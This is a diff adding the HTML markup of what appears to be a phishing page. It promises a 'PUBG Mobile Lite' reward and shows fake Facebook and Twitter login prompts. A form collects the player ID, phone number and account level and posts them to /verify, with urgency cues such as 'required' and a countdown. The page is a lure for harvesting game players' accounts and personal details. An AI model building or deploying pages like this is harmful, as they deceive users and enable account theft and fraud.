@@ -1,0 +1,193 @@
+<main x-data="pubg">
+  <div
+    x-show="$store.pubg_store.login_open"
+    class="
+      login_overlay
+      fixed
+      top-0
+      left-0
+      bottom-0
+      right-0
+      flex
+      justify-center
+      items-center
+      h-screen
+      w-full
+      bg-black bg-opacity-30
+      px-3
+    "
+  >
+    <div class="login_modal w-full md:w-96 bg-white rounded-md">
+      <div
+        class="
+          login_header
+          flex
+          justify-between
+          items-center
+          px-3
+          py-2
+          border-b-2 border-black
+        "
+      >
+        <h1 class="text-xl">Account Login</h1>
+        <button class="text-3xl" @click="login_close()">&times;</button>
+      </div>
+      <div class="login_body p-2">
+        <div
+          class="
+            login_title
+            mb-3
+            bg-black
+            sm:text-md
+            text-sm text-center text-yellow-500
+            capitalize
+            rounded-md
+            py-2
+          "
+        >
+          Login to <span class="uppercase">pubg mobile</span> light to correct
+          reward
+        </div>
+        <div
+          class="
+            login_facebook
+            cursor-pointer
+            flex
+            items-center
+            mb-1.5
+            bg-blue-900
+            sm:text-base
+            text-sm text-center text-white
+            capitalize
+            rounded-md
+            py-1
+          "
+        >
+          <i class="fab ml-4 fa-facebook-f text-xl"></i>
+          <h1 class="mx-auto text-md">Log in Using Facebook account</h1>
+        </div>
+        <div
+          class="
+            login_twitter
+            cursor-pointer
+            flex
+            items-center
+            bg-blue-600
+            sm:text-base
+            text-sm text-center text-white
+            capitalize
+            rounded-md
+            py-1
+          "
+        >
+          <i class="fab ml-4 fa-twitter text-xl"></i>
+          <h1 class="mx-auto text-md">Log in Using Twitter account</h1>
+        </div>
+      </div>
+    </div>
+  </div>
+
+  <div
+    class="md:px-6 px-2 py-8 bg-cover"
+    style="background-image: url(./img/thum_kv1.jpg)"
+  >
+    <div
+      class="
+        overlay
+        mx-auto
+        rounded-md
+        bg-black bg-opacity-30
+        flex
+        justify-center
+        items-center
+        flex-col
+        md:px-5
+        px-3
+        py-5
+      "
+    >
+      <div
+        class="
+          flex
+          w-full
+          justify-between
+          items-center
+          md:px-3
+          px-1.5
+          py-2
+          bg-blue-400
+          rounded-md
+        "
+      >
+        <h1 class="md:text-lg text-sm capitalize">
+          account details is required to send your selected reward
+        </h1>
+        <button
+          class="
+            capitalize
+            rounded-md
+            md:py-2
+            py-1.5
+            md:px-3
+            px-1.5
+            bg-black
+            font-black
+          "
+        >
+          <span
+            class="
+              text-yellow-500
+              md:text-lg
+              text-sm
+              count_down
+              my-1
+              capitalize
+            "
+          >
+            required</span
+          >
+        </button>
+      </div>
+      <div class="player_account_details w-full">
+        <form action="/verify" method="POST" @submit="close_item()">
+          <div class="flex flex-col justify-center mt-5">
+            <input
+              type="number"
+              class="rounded-md pl-4 outline-none py-3"
+              placeholder="Enter Your Player Id"
+              required
+            />
+            <input
+              type="tel"
+              class="my-3 rounded-md pl-4 outline-none py-3"
+              placeholder="Phone Number"
+              required
+            />
+            <select class="rounded-md pl-4 outline-none py-3 text-gray-400">
+              <option class="py-3" required disabled selected value="">
+                Account Level
+              </option>
+              <template x-for="i in 100">
+                <option class="p-4 rounded-md" value="i" x-text="i"></option>
+              </template>
+            </select>
+          </div>
+          <button
+            class="
+              capitalize
+              bg-yellow-500
+              p-3
+              mt-3
+              font-semibold
+              block
+              mx-auto
+            "
+            @click="close_item()"
+          >
+            Verify My account
+          </button>
+        </form>
+      </div>
+    </div>
+  </div>
+</main>
